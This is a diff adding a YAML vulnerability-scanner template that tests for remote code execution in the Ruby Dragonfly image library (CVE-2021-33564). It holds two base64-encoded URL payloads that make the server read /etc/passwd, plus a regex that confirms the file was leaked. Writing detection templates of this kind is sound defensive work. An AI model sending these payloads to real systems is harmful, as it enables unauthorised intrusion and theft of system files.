@@ -1,0 +1,63 @@
+id: RUBY_DRAGONFLY_RCE
+info:
+  name: "Ruby Dragonfly Remote Code Execution"
+  description: "This vulnerability affects applications using the Dragonfly library for processing images and other media. By exploiting improperly sanitized user input, attackers can craft malicious requests that execute arbitrary Ruby code on the server. This can lead to severe consequences, including unauthorized access, data manipulation, and complete system compromise. Prompt remediation is crucial to mitigate the risks associated with this vulnerability."
+  details: "This vulnerability arises from Dragonfly's handling of user-provided parameters in its image processing features. Specifically, attackers can manipulate these parameters to inject malicious Ruby code, which the application may execute without proper validation. This can occur through various routes, including image uploads or URL parameters. The affected versions of Dragonfly allow for exploitation if not properly patched or configured, making it critical for developers to address this security flaw."
+  impact: "Successful exploitation of the Ruby Dragonfly remote code execution vulnerability could allow attackers to execute arbitrary Ruby code on the server, potentially leading to full system compromise. This could result in unauthorized access to sensitive data, manipulation of application logic, or complete takeover of the affected application. The impact extends to loss of confidentiality, integrity, and availability of the system, posing significant risks to organizations using vulnerable versions of Dragonfly."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: RUBY_DRAGONFLY_RCE
+  severity: CRITICAL
+  references:
+    - "https://twitter.com/trbughunters/status/1283133356922884096"
+  cwe:
+    - CWE-77
+  cve:
+    - CVE-2021-33564
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+  url:
+    extract: urlVar
+  request_headers:
+    for_one:
+      key:
+        eq: "host"
+      value:
+        extract: hostHeaderVal
+wordLists:
+  urltests:
+    - "/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ=="
+    - "/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ=="
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_url: "${urltests}"
+        - modify_method: GET
+        - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    regex: "root:.*:0:0:"
+    not_contains:
+      - <html>
+      - </html>
+    length:
+      gt: 0
